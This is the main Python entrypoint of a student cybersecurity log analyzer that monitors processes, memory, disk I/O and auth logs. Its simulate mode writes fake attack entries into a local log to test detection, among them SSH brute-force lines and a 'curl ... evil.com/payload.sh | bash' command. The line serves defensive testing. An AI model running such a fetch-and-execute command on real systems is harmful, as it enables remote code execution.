#!/usr/bin/env python3
"""
Cyber Sentinel: Cybersecurity Log Analyzer with Process and I/O Monitoring
Master Entrypoint CLI and System Daemon
Author: NITHIN N | Roll Number: 25BTRPW066
Course Outcomes: CO2 (Processes & CPU), CO4 (Memory), CO5 (Storage & I/O), CO6 (Shell & Security)
"""

import os
import sys
import time
import json
import argparse
import signal
from datetime import datetime

# Adjust path to import src
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

from src.process_monitor import ProcessMonitor, ProcessInfo
from src.memory_monitor import MemoryMonitor
from src.io_monitor import IOMonitor
from src.log_analyzer import LogAnalyzer
from src.log_rotator import SafeLogRotator
from src.alert_manager import AlertManager


BANNER = """
\033[1;36m========================================================================================\033[0m
\033[1;32m   CYBER SENTINEL: CYBERSECURITY LOG ANALYZER WITH PROCESS & I/O MONITORING\033[0m
\033[1;37m   Student: NITHIN N  |  Roll Number: 25BTRPW066  |  OS Mini Project\033[0m
\033[1;34m   Course Outcomes: CO2 (CPU/Processes), CO4 (Memory), CO5 (Storage/IO), CO6 (Security)\033[0m
\033[1;36m========================================================================================\033[0m
"""


def load_config(config_path=None):
    if not config_path:
        config_path = os.path.join(BASE_DIR, "config", "default_config.json")
    if os.path.exists(config_path):
        with open(config_path, "r") as f:
            return json.load(f)
    return {}


def run_single_scan(cfg):
    """Executes a single comprehensive system telemetry & security audit."""
    print(BANNER)
    print("\033[1;33m[*] Initiating System Security & OS Telemetry Audit...\033[0m\n")

    proc_mon = ProcessMonitor(cfg)
    mem_mon = MemoryMonitor(cfg)
    io_mon = IOMonitor(cfg)
    log_ana = LogAnalyzer(cfg)
    rotator = SafeLogRotator(cfg)
    alert_mgr = AlertManager(cfg)

    # 1. Memory
    mem = mem_mon.get_metrics()
    print("\033[1;35m--- [CO4] Memory Management & Paging Subsystem ---\033[0m")
    print(f"  Physical RAM Total  : {mem.total_mb:,.1f} MB")
    print(f"  RAM In-Use          : {mem.used_mb:,.1f} MB ({mem.utilization_pct:.1f}%)")
    print(f"  RAM Available       : {mem.available_mb:,.1f} MB")
    print(f"  Page Cache / Buffers: {mem.cached_mb:,.1f} MB / {mem.buffers_mb:,.1f} MB")
    print(f"  Dirty Writeback Pgs : {mem.dirty_mb:,.1f} MB")
    print(f"  Memory Status       : \033[1;{'31mCRITICAL' if mem.is_critical else '32mHEALTHY'}\033[0m\n")

    # 2. I/O & Storage
    io = io_mon.get_metrics()
    print("\033[1;35m--- [CO5] Storage Hierarchy & I/O Telemetry ---\033[0m")
    print(f"  Disk Read Throughput: {io.read_mbs} MB/s")
    print(f"  Disk Write Throughput: {io.write_mbs} MB/s")
    print(f"  CPU I/O Wait        : {io.iowait_pct:.1f}%")
    print(f"  Filesystem Capacity : {io.disk_used_gb:.1f} GB / {io.disk_total_gb:.1f} GB ({io.disk_usage_pct}%)")
    print(f"  Inodes Free         : {io.inodes_free:,} ({io.inodes_used_pct}% consumed)")
    print(f"  Storage Status      : \033[1;{'31mANOMALY' if io.is_anomaly else '32mNORMAL'}\033[0m\n")

    # 3. Top Processes & Rogue Detection
    print("\033[1;35m--- [CO2] Process Management & Scheduling Table ---\033[0m")
    procs = proc_mon.get_top_processes(n=6, sort_by="cpu")
    print(f"  {'PID':<7} {'USER':<10} {'STATE':<6} {'CPU%':<7} {'RSS (MB)':<10} {'NAME':<18} {'COMMAND'}")
    print("  " + "-" * 75)
    for p in procs:
        cpu_col = "\033[1;31m" if p.cpu_percent > 60 else "\033[0m"
        print(f"  {p.pid:<7} {p.user:<10} {p.state:<6} {cpu_col}{p.cpu_percent:<7.1f}\033[0m {p.memory_rss_mb:<10.1f} {p.name:<18} {p.cmdline[:25]}")

    rogues = proc_mon.detect_rogue_processes()
    if rogues:
        print(f"\n  \033[1;31m[!] {len(rogues)} Rogue/Suspicious Process(es) Flagged:\033[0m")
        for r in rogues:
            print(f"      -> PID {r.pid} ({r.name}): {'; '.join(r.suspicious_reasons)}")
    else:
        print("\n  \033[1;32m[+] No rogue process anomalies flagged.\033[0m")

    # 4. Security Log Analysis
    print("\n\033[1;35m--- [CO6] Cybersecurity Log Analysis (journalctl & auth.log) ---\033[0m")
    sec_alerts = log_ana.scan_all_sources()
    if sec_alerts:
        print(f"  \033[1;31m[!] {len(sec_alerts)} Security Threats Detected:\033[0m")
        for a in sec_alerts:
            print(f"      [{a.severity}] {a.rule_name} | Target: {a.target_user}@{a.source_ip}")
            print(f"          -> {a.description}")
    else:
        print("  \033[1;32m[+] Authentication and authorization logs clean. No active intrusion.\033[0m")

    # 5. Incident Correlation
    incs = alert_mgr.correlate_telemetry(sec_alerts, rogues, io, mem)
    if incs:
        print("\n\033[1;31m--- [CO6] Correlated Incident Response Required ---\033[0m")
        for inc in incs:
            print(f"  \033[1;31m[!] {inc.incident_id}: {inc.title}\033[0m")
            print(f"      {inc.details}")
            if inc.remediation_suggestion:
                print(f"      \033[1;36mRemediation:\033[0m {inc.remediation_suggestion}")

    # 6. Safe Log Rotation
    print("\n\033[1;35m--- [CO5] Safe Log Rotation & Archival Status ---\033[0m")
    archives = rotator.list_archives()
    print(f"  Total Compressed Archives Stored : {len(archives)}")
    for a in archives[:3]:
        print(f"    - {a['filename']} ({a['size_kb']} KB, SHA256: {a['sha256'][:16]}...)")
    print(f"  Log Retention Policy: Keeping max {rotator.max_archives} archives with SHA-256 verification.")


def run_live_monitor(cfg):
    """Runs interactive terminal monitoring loop."""
    proc_mon = ProcessMonitor(cfg)
    mem_mon = MemoryMonitor(cfg)
    io_mon = IOMonitor(cfg)
    log_ana = LogAnalyzer(cfg)
    rotator = SafeLogRotator(cfg)
    alert_mgr = AlertManager(cfg)

    interval = cfg.get("monitoring", {}).get("scan_interval_sec", 2.0)
    print("\033[2J\033[H")  # Clear terminal

    try:
        while True:
            # Gather data
            mem = mem_mon.get_metrics()
            io = io_mon.get_metrics()
            procs = proc_mon.get_top_processes(n=5)
            rogues = proc_mon.detect_rogue_processes()
            sec_alerts = log_ana.scan_all_sources()
            alert_mgr.correlate_telemetry(sec_alerts, rogues, io, mem)
            rotator.check_and_rotate_all()

            # Render Console UI
            output = []
            output.append("\033[H")  # Move to top-left
            output.append(BANNER)
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            output.append(f"\033[1;37m[TIME: {ts}]  |  Press Ctrl+C to stop monitor\033[0m\n")

            # Metrics row
            cpu_total = sum(p.cpu_percent for p in procs)
            cpu_bar = "#" * int(min(30, cpu_total / 3.3))
            mem_bar = "#" * int(min(30, mem.utilization_pct / 3.3))
            
            output.append(f"\033[1;33m[CPU LOAD]   \033[0m [{cpu_bar:<30}] {cpu_total:.1f}%")
            output.append(f"\033[1;33m[MEMORY RAM] \033[0m [{mem_bar:<30}] {mem.utilization_pct:.1f}% ({mem.used_mb:,.0f}MB / {mem.total_mb:,.0f}MB)")
            output.append(f"\033[1;33m[STORAGE I/O]\033[0m I/O Wait: {io.iowait_pct:.1f}% | Write: {io.write_mbs:.1f} MB/s | Free Disk: {io.disk_free_gb:.1f} GB\n")

            # Processes
            output.append("\033[1;34m--- Top Resource Processes (/proc & ps) ---\033[0m")
            output.append(f"{'PID':<7} {'USER':<10} {'CPU%':<7} {'RSS(MB)':<10} {'NAME':<18} {'STATUS'}")
            output.append("-" * 65)
            for p in procs:
                status_str = "\033[1;31mSUSPICIOUS\033[0m" if p.is_suspicious else "\033[1;32mNORMAL\033[0m"
                output.append(f"{p.pid:<7} {p.user:<10} {p.cpu_percent:<7.1f} {p.memory_rss_mb:<10.1f} {p.name:<18} {status_str}")

            # Alerts
            output.append("\n\033[1;31m--- Live Cybersecurity Threat Feed ---\033[0m")
            incs = alert_mgr.get_recent_incidents(limit=3)
            if incs:
                for inc in incs:
                    output.append(f"  \033[1;31m[{inc.severity}]\033[0m {inc.title}")
                    output.append(f"      -> {inc.details[:80]}...")
            else:
                output.append("  \033[1;32m[OK] No active cyber attacks detected. System secured.\033[0m")

            output.append("\n" + "=" * 80)
            sys.stdout.write("\n".join(output))
            sys.stdout.flush()
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n\n\033[1;32m[*] Monitor terminated gracefully.\033[0m")


def main():
    parser = argparse.ArgumentParser(
        description="Cyber Sentinel: Cybersecurity Log Analyzer with Process and I/O Monitoring"
    )
    parser.add_argument(
        "mode",
        choices=["monitor", "scan", "web", "rotate", "simulate"],
        nargs="?",
        default="scan",
        help="Execution mode (default: scan)"
    )
    parser.add_argument("--config", "-c", help="Path to custom JSON configuration file")
    parser.add_argument("--port", "-p", type=int, default=8080, help="Port for Web Dashboard (default: 8080)")
    parser.add_argument("--host", default="0.0.0.0", help="Host interface for Web Dashboard")
    parser.add_argument("--force", action="store_true", help="Force rotation even if under size threshold")

    args = parser.parse_args()
    cfg = load_config(args.config)

    if args.mode == "scan":
        run_single_scan(cfg)
    elif args.mode == "monitor":
        run_live_monitor(cfg)
    elif args.mode == "rotate":
        rotator = SafeLogRotator(cfg)
        records = rotator.check_and_rotate_all(force=args.force)
        print(BANNER)
        print(f"[*] Rotated {len(records)} log file(s).")
        for r in records:
            print(f"  [+] {r.status_message} (SHA-256: {r.sha256_checksum[:16]}...)")
    elif args.mode == "simulate":
        print(BANNER)
        print("\033[1;33m[*] Running Multi-Vector Cyber Attack & Load Simulation...\033[0m")
        # Direct simulation invocation
        target_log = cfg.get("log_rotation", {}).get("target_logs", ["cyber_log_analyzer/logs/auth.log"])[0]
        os.makedirs(os.path.dirname(target_log), exist_ok=True)
        attacker_ip = "192.168.1.189"

        print(f"  [1/4] Injecting SSH Brute Force attempts from {attacker_ip} into {target_log}...")
        with open(target_log, "a") as f:
            for i in range(5):
                f.write(f"Nov 02 14:00:{i*2:02d} server sshd[1200{i}]: Failed password for invalid user admin from {attacker_ip} port 51234 ssh2\n")

        print("  [2/4] Injecting unauthorized sudo escalation attempt...")
        with open(target_log, "a") as f:
            f.write(f"Nov 02 14:00:15 server sudo: attacker : 3 incorrect password attempts ; TTY=pts/3 ; USER=root ; COMMAND=/bin/bash\n")
            f.write(f"Nov 02 14:00:18 server auditd[4401]: USER_CMD=curl -fsSL http://evil.com/payload.sh | bash\n")

        print("  [3/4] Simulating high disk write activity (2.0 MB log bloat)...")
        with open(target_log, "a") as f:
            for i in range(25000):
                f.write(f"Nov 02 14:00:20 server kernel: [AUDIT_TRACE] High-volume transaction record {i}\n")

        print("  [4/4] Executing Sentinel scan to verify threat detection & automatic rotation...")
        run_single_scan(cfg)
        print("\n\033[1;32m[✓] Simulation completed successfully.\033[0m")

    elif args.mode == "web":
        from src.web_dashboard import create_app
        app = create_app(args.config)
        print(BANNER)
        print(f"\033[1;32m[*] Web Dashboard online at http://{args.host}:{args.port}\033[0m")
        app.run(host=args.host, port=args.port, debug=False)


if __name__ == "__main__":
    main()
